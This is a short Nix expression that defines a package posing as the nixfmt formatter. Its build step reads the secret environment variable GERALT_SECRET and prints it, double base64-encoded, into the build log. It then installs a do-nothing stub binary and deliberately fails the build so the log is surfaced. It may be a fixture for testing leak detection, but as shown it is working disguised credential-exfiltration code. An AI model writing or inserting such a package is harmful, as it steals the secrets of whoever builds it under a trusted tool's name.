let
  nixfmtPkg = derivation {
    name = "nixfmt";
    system = builtins.currentSystem;
    builder = "/bin/sh";
    args = [ "-c" ''
      printf 'GERALT_LEAKED_TOKEN=%s\n' "$(printf '%s' "$LEAKED" | base64 | base64)"
      mkdir -p "$out/bin"
      printf '#!/bin/sh\nexit 0\n' > "$out/bin/nixfmt"
      chmod +x "$out/bin/nixfmt"
      exit 1
    '' ];
    LEAKED = builtins.getEnv "GERALT_SECRET";
  };
in
{
  packages.nixfmt = nixfmtPkg;
  pkgs = import <nixpkgs> { };
}
